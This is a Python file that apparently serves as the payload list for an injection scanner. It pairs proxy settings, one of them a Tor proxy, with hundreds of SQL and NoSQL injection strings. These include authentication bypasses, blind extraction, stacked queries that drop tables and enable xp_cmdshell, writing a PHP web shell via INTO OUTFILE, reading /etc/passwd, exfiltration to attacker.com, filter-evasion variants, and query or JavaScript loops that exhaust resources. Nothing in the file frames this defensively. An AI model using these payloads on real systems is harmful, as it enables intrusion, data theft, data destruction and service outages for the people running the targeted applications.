proxies_list = [
    {"http": "http://127.0.0.1:8080"},
    {"http": "http://127.0.0.1:9050"},  # TOR
]

sql_payloads = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION SELECT database(),user(),version()--",
    "' UNION SELECT table_name,column_name,null FROM information_schema.columns--",
    "' UNION SELECT group_concat(table_name),null,null FROM information_schema.tables--",
    "' UNION SELECT @@version,@@datadir,@@hostname--",
    
# ----------------------------
# ERROR-BASED
# ----------------------------
    "' AND extractvalue(1,concat(0x7e,database()))--",
    "' AND updatexml(1,concat(0x7e,database()),1)--",
    "' AND (select * from(select(sleep(5)))a)--",
    "' AND geometrycollection((select * from(select * from(select user())a)b))--",
    "' AND multipoint((select * from(select * from(select user())a)b))--",
    "' AND GTID_SUBSET(@@version,0)--",
    "' AND ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1)) > 64--",
    
# ----------------------------
# TIME-BASED BLIND
# ----------------------------
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,MD5('test'))--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0)--",
    "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
    "' AND RLIKE SLEEP(5)--",
    "' OR SLEEP(5) AND '1'='1",
    "'; WAITFOR DELAY '00:00:05'--",
    
# ----------------------------
# BOOLEAN-BASED BLIND
# ----------------------------
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",
    "' OR '1'='1'--",
    "' OR '1'='2'--",
    "' AND ASCII(SUBSTRING(database(),1,1))>64--",
    "' AND (SELECT SUBSTRING(database(),1,1))='a'--",
    
# ----------------------------
# STACKED QUERIES
# ----------------------------
    "'; DROP TABLE users--",
    "'; INSERT INTO admin VALUES('hacker','pass')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; DELETE FROM logs--",
    "'; CREATE TABLE backdoor(id INT, cmd VARCHAR(100))--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
    
# ----------------------------
# ENCODED / OBFUSCATED
# ----------------------------
    "%27%20UNION%20SELECT%20NULL--",
    "%27%20AND%20SLEEP%285%29--",
    "%27%20OR%20%271%27%3D%271%27--",
    "%27%20AND%201%3D1%23",
    "%27%20UNION%20SELECT%20database%28%29--%20",
    "%27%20%7C%7C%20SLEEP%285%29--",
    "%27%20%26%26%20SLEEP%285%29--",
    "1%27%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--",
    
# ----------------------------
# COMMENT BYPASSES
# ----------------------------
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 /*",
    "' OR 1=1 ;--",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "admin'--",
    "admin' #",
    "admin'/*",
    
# ----------------------------
# AUTHENTICATION BYPASS
# ----------------------------
    "' OR '1'='1'",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1' AND ''='",
    "' OR ''='",
    "admin' OR '1'='1",
    "admin'--",
    "') OR ('1'='1",
    "' UNION SELECT 'admin', 'password'--",
    
# ----------------------------
# DATABASE FINGERPRINTING
# ----------------------------
    "' AND @@version LIKE '%Maria%'--",
    "' AND @@version_compile_os LIKE '%Linux%'--",
    "' AND user() LIKE '%root%'--",
    "' AND database() LIKE '%db%'--",
    "' AND (SELECT version())--",
    "' AND (SELECT user())--",
    "' AND (SELECT database())--",
    
# ----------------------------
# FILE SYSTEM ACCESS
# ----------------------------
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')--",
    "' INTO OUTFILE '/tmp/shell.php' FIELDS TERMINATED BY '<?php system($_GET[cmd]); ?>'--",
    "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
    
# ----------------------------
# DNS EXFILTRATION
# ----------------------------
    "' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))--",
    "' SELECT * FROM users WHERE id=1 AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT database())))--",
    
# ----------------------------
# SECOND ORDER INJECTION
# ----------------------------
    "admin' AND 1=1--",
    "admin' AND SLEEP(5)--",
    "admin'; UPDATE users SET role='admin' WHERE username='user'--",
    
# ----------------------------
# WAF BYPASS TECHNIQUES
# ----------------------------
    "' OR 1=1-- -",
    "' OR 1=1#%0a",
    "' OR 1=1%23",
    "' /*!50000OR*/ 1=1--",
    "' OR 1=1 AND '1'='1",
    "' OR 1=1 AND '1' LIKE '1",
    "' OR 1=1 AND '1'='1'--",
    "' OORR 1=1--",
    "' O/**/R 1=1--",
    "' OR 1=1--\t",
    "' OR 1=1--\n",
    "' OR 1=1--\r",
    "' OR 1=1--\x00",
    "' OR 1=1%00--",
    
# ----------------------------
# MYSQL SPECIFIC
# ----------------------------
    "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,database())),1)--",
    
# ----------------------------
# MSSQL SPECIFIC
# ----------------------------
    "'; EXEC master..xp_cmdshell 'whoami'--",
    "'; SELECT * FROM sysobjects--",
    "'; SELECT name FROM sys.databases--",
    "'; SELECT @@VERSION--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
    
# ----------------------------
# POSTGRESQL SPECIFIC
# ----------------------------
    "'; SELECT pg_sleep(5)--",
    "'; SELECT version()--",
    "'; SELECT current_database()--",
    "'; SELECT usename FROM pg_user--",
    "'; CREATE TABLE backdoor(cmd text)--",
    
# ----------------------------
# ORACLE SPECIFIC
# ----------------------------
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--",
    "' AND 1=(SELECT user FROM DUAL)--",
    "' AND 1=(SELECT version FROM v$instance)--",
    "' AND 1=UTL_INADDR.get_host_address((SELECT user FROM DUAL))--",
    "'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
    
# ----------------------------
# OUT OF BAND (OOB)
# ----------------------------
    "' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT database())))--",
    "' AND (SELECT xp_cmdshell('nslookup attacker.com'))--",
    "' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))--",
    
# ----------------------------
# HEAVY QUERIES (ReDoS)
# ----------------------------
    "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--",
    "' AND (SELECT BENCHMARK(10000000,MD5('test')))--",
    "' AND (SELECT SLEEP(5) FROM (SELECT SLEEP(5))a)--",
    
# ----------------------------
# JSON / NOSQL MIX
# ----------------------------
    '{"username": {"$ne": null}, "password": {"$regex": "^.*"}}',
    '{"$where": "this.username == \'admin\' && sleep(5000)"}',
    '{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
]




no_sql_payloads = [
    "%27%7B%22%24ne%22%3A%20%22%22%7D",           # '{"$ne": ""}
    "%27%7B%22%24gt%22%3A%20%22%22%7D",           # '{"$gt": ""}
    "%27%7B%22%24regex%22%3A%20%22%5E.*%22%7D",   # '{"$regex": "^.*"}
    "%27%7B%22%24exists%22%3A%20true%7D",         # '{"$exists": true}
    "%27%7D%27%20%26%26%20this.password%20%3D%3D%20%27secret%27",  # '}' && this.password == 'secret'
    "%27%7B%22%24where%22%3A%20%22this.username%20%3D%3D%20%27admin%27%22%7D",  # '{"$where": "this.username == 'admin'"}
    "%27%20%7C%7C%20this.password.match%28%2F%5E%2F%29",  # ' || this.password.match(/^/)
    "%27%7B%22%24in%22%3A%20%5B%22admin%22%2C%20%22root%22%5D%7D",  # '{"$in": ["admin", "root"]}
    "%27%7B%22%24nin%22%3A%20%5B%22user%22%5D%7D",  # '{"$nin": ["user"]}
    "%27%7B%22%24size%22%3A%200%7D",              # '{"$size": 0}
    "%27%7B%22%24type%22%3A%20%22string%22%7D",   # '{"$type": "string"}
    
    # ----------------------------
    # URL PARAMETER POLLUTION
    # ----------------------------
    "username[$ne]=&password[$ne]=",
    "username[$gt]=&password[$gt]=",
    "username[$regex]=^admin&password[$ne]=",
    "username[$exists]=true&password[$ne]=",
    "search[$ne]=null&role[$ne]=user",
    "username[$ne]=&password[$regex]=^.*",
    "username[$nin][]=admin&username[$nin][]=root",
    "password[$regex]=^.{8}$",
    
    # ----------------------------
    # JSON INJECTION (for POST data)
    # ----------------------------
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": "admin", "password": {"$regex": "^.*"}}',
    '{"username": "admin", "$where": "sleep(5000)"}',
    '{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
    '{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}',
    '{"username": "admin", "password": {"$exists": true}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}',
    '{"$and": [{"username": "admin"}, {"password": {"$regex": "^.{8}$"}}]}',
    '{"$where": "this.username == \'admin\' && this.password.length > 0"}',
    
    # ----------------------------
    # OPERATOR INJECTION (raw)
    # ----------------------------
    '{$ne: ""}',
    '{$gt: ""}',
    '{$regex: "^.*"}',
    '{$exists: true}',
    '{$where: "this.username == \'admin\'"}',
    '{$or: [{"username": "admin"}, {"username": {"$gt": ""}}]}',
    '{$in: ["admin", "root"]}',
    '{$nin: ["user", "guest"]}',
    '{$size: 4}',
    '{$type: "string"}',
    
    # ----------------------------
    # JAVASCRIPT EXECUTION
    # ----------------------------
    "'; return true; var foo='",
    "'; sleep(5000); var foo='",
    "'; throw new Error(this.password); var foo='",
    "'; while(true){} var foo='",
    "'; return /admin/.test(this.username); var foo='",
    "'; return this.password.charAt(0) == 'a'; var foo='",
    "'; return this.username.length > 5; var foo='",
    
    # ----------------------------
    # TIME-BASED (encoded)
    # ----------------------------
    "%27%7B%22%24where%22%3A%20%22sleep%285000%29%20%7C%7C%20this.username%20%3D%3D%20%27admin%27%22%7D",
    "%27%3B%20sleep%285000%29%3B%20var%20foo%3D%27",
    "%27%7B%22%24where%22%3A%20%22new%20Date%28%29%20-%20new%20Date%282020%2C0%2C1%29%20%3C%205000%20%3F%20true%20%3A%20sleep%285000%29%22%7D",
    "%27%7B%22%24where%22%3A%20%22function%28%29%7B%20sleep%285000%29%3B%20return%20true%3B%20%7D%28%29%22%7D",
    
    # ----------------------------
    # EDGE CASES (NoSQL specific)
    # ----------------------------
    "' || '1'=='1' && this.password.match(/.*/)",
    "' || this.username == 'admin' && '1'=='1",
    "' && this.password.length > 0 || '1'=='0",
    "' || 1==1 && ''=='",
    "' || this.role == 'admin' && '1'=='1",
    "' && ($where: 'this.password == \"secret\"') || '1'=='0",
    "' || (function(){ return true; })() && '1'=='1",
    "' || this.toString().match(/admin/) && '1'=='1",
    "' && new Date() - new Date(2020,0,1) > 5000 || '1'=='0",
    "' || /admin/.test(this.username) && '1'=='1",
    "' || 1==1 //",
    "' || '1'=='1' --",
    "' || 1=1 #",
    
    # ----------------------------
    # ARRAY/VALUE MODIFICATION
    # ----------------------------
    "[$ne]=null",
    "[$gt]=",
    "[$regex]=.*",
    "[$exists]=true",
    "[$type]=string",
    "[$size]=4",
    "[$nin]=[admin,root]",
    "[$all]=[admin,user]",
    "[$mod]=[2,0]",
    
    # ----------------------------
    # BLIND BOOLEAN PAYLOADS
    # ----------------------------
    '{"username": {"$regex": "^a"}, "password": {"$ne": ""}}',
    '{"username": {"$regex": "^[a-z]"}, "password": {"$ne": ""}}',
    '{"$where": "this.password[0] == \'a\'"}',
    '{"$where": "this.password.length > 5"}',
    '{"username": "admin", "$where": "this.password.match(/^a/)"}',
]
